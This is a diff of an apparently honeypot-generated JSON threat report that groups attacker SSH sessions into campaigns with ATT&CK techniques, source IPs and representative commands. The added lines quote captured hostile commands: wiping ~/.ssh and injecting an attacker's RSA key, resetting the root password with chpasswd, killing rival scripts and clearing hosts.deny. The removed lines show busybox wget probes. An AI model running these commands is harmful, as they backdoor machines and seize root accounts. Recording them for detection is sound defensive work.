@@ -1,31 +1,36 @@
 {
-  "generated_at": "2026-05-19T15:31:49.495827+00:00",
-  "total_sessions_with_commands": 4,
+  "generated_at": "2026-05-19T18:08:56.708329+00:00",
+  "total_sessions_with_commands": 7,
   "total_clusters": 2,
   "campaign_clusters": 2,
-  "singleton_clusters": 1,
+  "singleton_clusters": 0,
   "highest_severity": "HIGH",
   "active_campaigns": [
     {
       "cluster_id": "CLU-001",
-      "name": "Mirai/IoT Botnet",
+      "name": "mdrfckr SSH Key Injection",
       "severity": "HIGH",
-      "session_count": 1,
-      "unique_ip_count": 1,
+      "session_count": 2,
+      "unique_ip_count": 2,
       "ttps": [
-        "T1105",
+        "T1021.004",
+        "T1078",
         "T1083",
+        "T1082",
+        "T1592",
         "T1070",
         "T1140",
-        "T1059.004"
+        "T1547",
+        "T1489",
+        "T1105"
       ]
     },
     {
       "cluster_id": "CLU-002",
       "name": "mdrfckr SSH Key Injection",
       "severity": "HIGH",
-      "session_count": 3,
-      "unique_ip_count": 3,
+      "session_count": 5,
+      "unique_ip_count": 5,
       "ttps": [
         "T1021.004",
         "T1078",
@@ -39,36 +44,50 @@
     {
       "cluster_id": "CLU-001",
       "is_campaign": true,
-      "campaign_name": "Mirai/IoT Botnet",
+      "campaign_name": "mdrfckr SSH Key Injection",
       "campaign_severity": "HIGH",
-      "campaign_description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
+      "campaign_description": "Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.",
       "matched_campaigns": [
         {
-          "name": "Mirai/IoT Botnet",
+          "name": "mdrfckr SSH Key Injection",
           "ttps": [
-            "T1105",
-            "T1059.004"
+            "T1021.004",
+            "T1078",
+            "T1105"
           ],
           "severity": "HIGH",
-          "description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
-          "pattern_hits": 2,
+          "description": "Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.",
+          "pattern_hits": 3,
           "pattern_total": 3
         }
       ],
-      "session_count": 1,
+      "session_count": 2,
       "unique_ips": [
-        "125.79.167.24"
+        "180.103.119.98",
+        "180.100.217.164"
       ],
-      "unique_ip_count": 1,
-      "sequence_hash": "08def998795ae6e4",
+      "unique_ip_count": 2,
+      "sequence_hash": "df6af7b42f74a638",
       "ttps": [
         {
-          "id": "T1105",
-          "name": "Ingress Tool Transfer"
+          "id": "T1021.004",
+          "name": "Remote Services: SSH"
+        },
+        {
+          "id": "T1078",
+          "name": "Valid Accounts"
         },
         {
           "id": "T1083",
           "name": "File & Directory Discovery"
+        },
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        },
+        {
+          "id": "T1592",
+          "name": "Gather Victim Host Info"
         },
         {
           "id": "T1070",
@@ -79,30 +98,46 @@
           "name": "Deobfuscate/Decode Files"
         },
         {
-          "id": "T1059.004",
-          "name": "T1059.004"
+          "id": "T1547",
+          "name": "Boot/Logon Autostart"
+        },
+        {
+          "id": "T1489",
+          "name": "Service Stop"
+        },
+        {
+          "id": "T1105",
+          "name": "T1105"
         }
       ],
       "representative_commands": [
-        "start",
-        "enable",
-        "config terminal",
-        "system",
-        "linuxshell",
-        "su",
-        "shell",
-        "sh",
-        "cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /;/bin/busybox echo -ne '\\x45\\x4c\\x46'",
-        "/bin/busybox wget;/bin/busybox echo -ne '\\x45\\x4c\\x46'"
+        "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+        "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+        "cat /proc/cpuinfo | grep name | wc -l",
+        "echo \"root:nImpNkrbYbS4\"|chpasswd|bash",
+        "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;",
+        "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
+        "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
+        "ls -lh $(which ls)",
+        "which ls",
+        "crontab -l"
       ],
       "members": [
         {
-          "session_id": "IR-e01a3be3383e",
-          "src_ip": "125.79.167.24",
+          "session_id": "IR-1ffed0e185a7",
+          "src_ip": "180.100.217.164",
           "country": "",
           "isp": "",
-          "command_count": 16,
-          "timestamp": "2026-05-19T14:20:20.509784Z"
+          "command_count": 19,
+          "timestamp": "2026-05-19T16:08:45.084124Z"
+        },
+        {
+          "session_id": "IR-2a85004472e1",
+          "src_ip": "180.103.119.98",
+          "country": "",
+          "isp": "",
+          "command_count": 19,
+          "timestamp": "2026-05-19T16:29:37.023320Z"
         }
       ]
     },
@@ -126,13 +161,15 @@
           "pattern_total": 3
         }
       ],
-      "session_count": 3,
+      "session_count": 5,
       "unique_ips": [
-        "168.231.122.123",
-        "77.239.111.233",
-        "188.127.161.78"
+        "152.244.200.198",
+        "180.103.119.98",
+        "49.229.102.187",
+        "152.32.218.149",
+        "43.153.80.54"
       ],
-      "unique_ip_count": 3,
+      "unique_ip_count": 5,
       "sequence_hash": "98af0db988d5971c",
       "ttps": [
         {
@@ -162,28 +199,44 @@
       ],
       "members": [
         {
-          "session_id": "IR-3181db1934ba",
-          "src_ip": "168.231.122.123",
+          "session_id": "IR-b90821f56a4a",
+          "src_ip": "152.32.218.149",
           "country": "",
           "isp": "",
           "command_count": 2,
-          "timestamp": "2026-05-19T13:37:49.734790Z"
+          "timestamp": "2026-05-19T16:07:06.257351Z"
         },
         {
-          "session_id": "IR-5a2090b76ab7",
-          "src_ip": "77.239.111.233",
+          "session_id": "IR-09342408d637",
+          "src_ip": "152.244.200.198",
           "country": "",
           "isp": "",
           "command_count": 2,
-          "timestamp": "2026-05-19T13:39:11.994879Z"
+          "timestamp": "2026-05-19T16:14:11.686086Z"
         },
         {
-          "session_id": "IR-5b91c690c369",
-          "src_ip": "188.127.161.78",
+          "session_id": "IR-852d1262613e",
+          "src_ip": "49.229.102.187",
           "country": "",
           "isp": "",
           "command_count": 2,
-          "timestamp": "2026-05-19T13:51:40.754122Z"
+          "timestamp": "2026-05-19T16:15:53.512832Z"
+        },
+        {
+          "session_id": "IR-53f1089d261e",
+          "src_ip": "43.153.80.54",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-05-19T16:17:03.023521Z"
+        },
+        {
+          "session_id": "IR-7849d87fd73f",
+          "src_ip": "180.103.119.98",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-05-19T16:34:24.228926Z"
         }
       ]
     }
